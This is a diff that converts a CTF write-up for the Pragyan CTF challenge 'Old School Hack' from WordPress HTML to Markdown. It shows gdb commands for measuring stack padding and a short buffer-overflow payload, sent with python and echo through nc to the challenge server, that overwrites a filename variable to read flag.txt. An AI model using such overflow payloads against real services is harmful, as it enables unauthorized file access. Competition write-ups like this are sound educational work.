@@ -1,4 +1,5 @@
-<p style="text-align: left;"><img class="size-full wp-image-120 aligncenter" src="https://killyp.com/wp-content/uploads/2018/03/logo-1.png" alt="" width="600" height="284" /></p>
+# Old School Hack
+
 <p style="text-align: left;">"Old School Hack" was the one and only exploit focused problem of the Pragyan CTF.  As with every exploit problem, I first copy the binary, police_acedemy, to a Linux VM to run some initial commands on the binary.</p>
 <p style="text-align: left;">File command to see what kind of executable we are working with.</p>
 <p style="text-align: left;"><img class="size-full wp-image-121 aligncenter" src="https://killyp.com/wp-content/uploads/2018/03/Capture-3.jpg" alt="" width="1014" height="68" /></p>
@@ -30,13 +31,13 @@
 <p style="text-align: left;">So let's run the program in gdb to figure out the size of padding needed on the stack between the password and filename variables.</p>
 
 
-[code]
+```
 gdb police_acedmy       // Start gdb
 b *0x4009e6             // Set Breakpoint after scanf call for password
 run
 kaiokenx20AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
 x/s $rbp-0x30           // The locoation of Var_30 which is our filename
-[/code]
+```
 
 <p style="text-align: left;">This will return:</p>
 
@@ -44,12 +45,16 @@ x/s $rbp-0x30           // The locoation of Var_30 which is our filename
 <p style="text-align: left;">So we know the needed buffer between the password is "AAAABB" or 6 bytes. So let's write our exploit! The payload of our exploit will be constructed "password + padding + filename".</p>
 
 
-[python]python -c 'print("kaiokenx20"+"AAAABB"+"././././././././././././././flag.txt")' | nc 128.199.224.175 13000[/python]
+```python
+python -c 'print("kaiokenx20"+"AAAABB"+"././././././././././././././flag.txt")' | nc 128.199.224.175 13000
+```
 
 <p style="text-align: left;">Since this payload of this exploit is all ASCII we can also use the echo command to pipe in our input.</p>
 
 
-[bash]echo "kaiokenx20AAAABB././././././././././././././flag.txt" | nc 128.199.224.175 13000[/bash]
+```bash
+echo "kaiokenx20AAAABB././././././././././././././flag.txt" | nc 128.199.224.175 13000
+```
 
 <p style="text-align: left;"><img class="size-full wp-image-135 aligncenter" src="https://killyp.com/wp-content/uploads/2018/03/Capture-6.png" alt="" width="913" height="339" /></p>
 <p style="text-align: left;">Success!!!</p>
